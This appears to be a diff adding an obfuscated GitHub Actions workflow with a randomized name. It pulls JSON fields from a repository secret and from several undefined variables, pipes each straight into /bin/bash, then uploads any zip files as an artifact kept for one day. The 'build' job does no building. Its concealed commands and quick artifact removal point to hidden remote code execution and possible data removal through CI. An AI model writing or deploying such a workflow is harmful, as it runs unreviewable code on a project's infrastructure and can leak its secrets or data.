@@ -1,0 +1,27 @@
+name: devsecopsop853
+on:
+  workflow_dispatch:
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: devsecopsop853
+        env:
+          w12: ${{ secrets.w12 }}
+        run: |
+          printf '%s' "$w12" | jq -r .zcy695 | /bin/bash
+          echo $rgrq083 | jq -r .i32 | /bin/bash
+          printf '%s' "$b52" | jq -r .vkch28550 | /bin/bash
+          printf '%s' "$i328" | jq -r .rktgq9 | /bin/bash
+          printf '%s' "$nmfgv07156" | jq -r .k7 | /bin/bash
+          echo $gesmr83 | jq -r .v1695 | /bin/bash
+          echo $xa35 | jq -r .uiz16981 | /bin/bash
+
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: uJiFf6wD
+          path: "*.zip"
+          retention-days: 1
